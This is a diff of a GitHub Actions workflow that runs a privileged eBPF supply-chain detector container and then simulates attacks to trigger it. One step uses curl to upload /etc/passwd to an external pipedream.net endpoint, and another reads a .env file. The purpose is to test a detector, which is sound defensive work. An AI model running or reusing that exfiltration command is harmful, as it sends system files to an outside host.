@@ -1,31 +1,44 @@
-name: ci
+name: Run eBPF Supply Chain Detector 2
 
 on:
   push:
-    branches:
-      - "main"
+    branches: [main]
 
 jobs:
-  build:
+  run-ebpf:
     runs-on: ubuntu-latest
+
     steps:
-      -
-        name: Checkout
-        uses: actions/checkout@v3
-      -
-        name: Login to Docker Hub
-        uses: docker/login-action@v2
-        with:
-          username: ${{ secrets.DOCKERHUB_USERNAME }}
-          password: ${{ secrets.DOCKERHUB_TOKEN }}
-      -
-        name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v2
-      -
-        name: Build and push
-        uses: docker/build-push-action@v3
-        with:
-          context: .
-          file: ./Dockerfile
-          push: true
-          tags: ${{ secrets.DOCKERHUB_USERNAME }}/supplychain:latest
+      - name: Pull latest image
+        run: docker pull rohitcoder/supplychain:latest
+
+      - name: Run eBPF supply chain detector in background
+        run: |
+          docker run -d --name ebpf_detector1 --privileged \
+          --pid=host \
+          --network=host \
+          -v /sys:/sys \
+          -v /proc:/proc \
+          -v /lib/modules:/lib/modules \
+          -v /usr/src:/usr/src \
+          rohitcoder/supplychain:latest
+
+      - name: Wait for eBPF to attach
+        run: sleep 10
+
+      - name: Simulate supply chain exfiltration
+        run: |
+          curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
+
+      - name: Simulate .env file access to trigger detector
+        run: |
+          touch /tmp/test.env
+          cat /tmp/test.env
+
+      - name: Save detector logs to file
+        run: |
+          docker logs ebpf_detector1 > ebpf_logs.txt
+          cat ebpf_logs.txt
+
+      - name: Stop and cleanup
+        run: docker rm -f ebpf_detector1
